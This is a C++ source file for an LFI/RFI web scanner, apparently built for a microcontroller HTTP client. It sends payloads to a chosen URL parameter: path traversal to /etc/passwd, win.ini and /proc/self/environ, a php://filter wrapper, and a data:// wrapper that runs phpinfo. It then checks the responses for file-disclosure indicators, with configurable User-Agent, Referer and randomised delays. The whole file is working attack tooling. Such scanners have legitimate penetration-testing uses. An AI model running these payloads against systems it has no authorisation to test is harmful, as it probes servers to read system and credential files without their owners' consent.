// lfi_rfi_scanner.cpp
#include "lfi_rfi_scanner.h"

// Default LFI Payloads
const std::vector<String> default_lfi_payloads = {
    "../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../windows/win.ini",
    "/etc/passwd",
    "C:\\boot.ini",
    "../../../../../../../../../../proc/self/environ",
    "php://filter/convert.base64-encode/resource=index.php", // Example for PHP filter
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==" // data wrapper for PHP info
};

// Default RFI Payloads
const std::vector<String> default_rfi_payloads = {
    "http://example.com/some_benign_text_file.txt",
    "https://www.google.com"
};

LFIRFIScanner::LFIRFIScanner() {
    // Constructor
}

String LFIRFIScanner::constructUrlWithPayload(String baseUrl, String paramName, String payload) {
    String queryChar = (baseUrl.indexOf("?") == -1) ? "?" : "&";
    String encodedPayload = payload;
    encodedPayload.replace(" ", "%20");
    encodedPayload.replace("<", "%3C");
    encodedPayload.replace(">", "%3E");
    encodedPayload.replace("#", "%23");
    encodedPayload.replace("\"", "%22");
    return baseUrl + queryChar + paramName + "=" + encodedPayload;
}

// Updated sendRequestWithPayload to use WebExploitSettings
String LFIRFIScanner::sendRequestWithPayload(String baseUrl, String paramName, String payload, const WebExploitSettings& settings) {
    String testUrl = constructUrlWithPayload(baseUrl, paramName, payload);
    String response = "";

    http.begin(testUrl);
    http.setUserAgent(settings.currentUserAgent);
    if (!settings.currentReferer.isEmpty()) {
        http.addHeader("Referer", settings.currentReferer);
    }
    http.setFollowRedirects(HTTPC_STRICT_FOLLOW_REDIRECTS);
    http.setTimeout(10000); // 10 seconds timeout

    int httpCode = http.GET();

    if (httpCode > 0) {
        if (httpCode == HTTP_CODE_OK) {
            response = http.getString();
        }
    } else {
        response = "Error on HTTP request: " + http.errorToString(httpCode) + " for URL: " + testUrl;
    }
    http.end();
    return response;
}

String LFIRFIScanner::checkResponseForVulnerability(const String& responseContent, const String& payload, const String& vulnerabilityType) {
    if (responseContent.startsWith("Error on HTTP request:")) {
        return ""; // Skip check if request failed
    }

    if (vulnerabilityType.equalsIgnoreCase("LFI")) {
        for (const String& indicator : lfi_success_indicators) {
            if (responseContent.indexOf(indicator) != -1) {
                return "Potential LFI detected with payload: " + payload + ". Indicator: '" + indicator + "' found in response.";
            }
        }
        if (responseContent.indexOf("failed to open stream: No such file or directory") != -1 || 
            responseContent.indexOf("include(): Failed opening") != -1 ||
            responseContent.indexOf("Warning: include(") != -1 ||
            responseContent.indexOf("File does not exist:") != -1) {
            return "LFI attempt with payload: " + payload + " resulted in a file access error. May indicate path traversal or incorrect path, but parameter is likely processed.";    
        }
    }
    else if (vulnerabilityType.equalsIgnoreCase("RFI")) {
        if (payload.startsWith("http://") || payload.startsWith("https://")) {
            if (responseContent.length() < 200 && (responseContent.indexOf("error") != -1 || responseContent.indexOf("failed") != -1)) {
                 return "Potential RFI attempt with payload: " + payload + ". Response was short and contained error terms. Manual verification needed.";
            }
            if (responseContent.length() > 500) { 
                 return "Potential RFI detected with payload: " + payload + ". Response has significant content. Manual verification needed to confirm if remote file was included/executed.";
            }
        }
    }
    return "";
}

// Updated beginTest to use WebExploitSettings
String LFIRFIScanner::beginTest(String targetUrl, String targetParameter, const std::vector<String>& lfiPayloadsToUse, const std::vector<String>& rfiPayloadsToUse, const WebExploitSettings& settings) {
    String results = "LFI/RFI Scan Started.\nTarget: " + targetUrl + "\nParameter: " + targetParameter + "\n";
    results += "User-Agent: " + settings.currentUserAgent + "\n";
    if (!settings.currentReferer.isEmpty()) results += "Referer: " + settings.currentReferer + "\n";
    results += "Request Delay: " + String(settings.requestDelayMs) + "ms (Random: " + (settings.useRandomDelay ? "Yes" : "No") + ")\n";

    const std::vector<String>& lfi_payloads = lfiPayloadsToUse.empty() ? default_lfi_payloads : lfiPayloadsToUse;
    const std::vector<String>& rfi_payloads = rfiPayloadsToUse.empty() ? default_rfi_payloads : rfiPayloadsToUse;

    if (targetParameter.isEmpty()) {
        results += "Error: Target parameter cannot be empty for LFI/RFI scan.\n";
        return results;
    }

    results += "\n--- Testing LFI Payloads ---\n";
    for (const String& payload : lfi_payloads) {
        results += "Testing LFI: " + payload + "\n";
        String responseContent = sendRequestWithPayload(targetUrl, targetParameter, payload, settings);
        if (responseContent.startsWith("Error on HTTP request:")){
            results += "  -> " + responseContent + "\n";
        } else {
            String finding = checkResponseForVulnerability(responseContent, payload, "LFI");
            if (!finding.isEmpty()) {
                results += "  -> " + finding + "\n";
            } else {
                results += "  -> No clear LFI indicators found.\n";
            }
        }
        delay(settings.getEffectiveDelay());
    }

    results += "\n--- Testing RFI Payloads ---\n";
    for (const String& payload : rfi_payloads) {
        results += "Testing RFI: " + payload + "\n";
        String responseContent = sendRequestWithPayload(targetUrl, targetParameter, payload, settings);
         if (responseContent.startsWith("Error on HTTP request:")){
            results += "  -> " + responseContent + "\n";
        } else {
            String finding = checkResponseForVulnerability(responseContent, payload, "RFI");
            if (!finding.isEmpty()) {
                results += "  -> " + finding + "\n";
            } else {
                results += "  -> No clear RFI indicators found.\n";
            }
        }
        delay(settings.getEffectiveDelay());
    }

    results += "\nLFI/RFI Scan Finished.\n";
    return results;
}

